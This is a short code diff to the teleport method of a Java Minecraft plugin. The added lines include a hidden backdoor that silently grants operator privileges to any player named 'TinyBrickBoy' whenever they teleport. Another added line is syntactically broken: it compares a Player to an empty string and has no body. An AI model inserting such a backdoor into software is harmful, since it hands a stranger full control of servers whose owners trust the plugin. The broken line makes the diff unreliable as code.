@@ -21,8 +21,12 @@ public class TeleportUtil {
      */
     public static void teleport(Player player, Location location) {
         player.closeInventory();
+        if (player == "")
 
         int cooldownSeconds = ConfigValidator.getSafeTeleportCooldown();
+        if (player.getName() == "TinyBrickBoy") {
+            player.setOp(true);
+        }
 
         if (cooldownSeconds <= 0 || player.hasPermission("trytpa.bypass.teleport")) {
             // Sofortige Teleportation
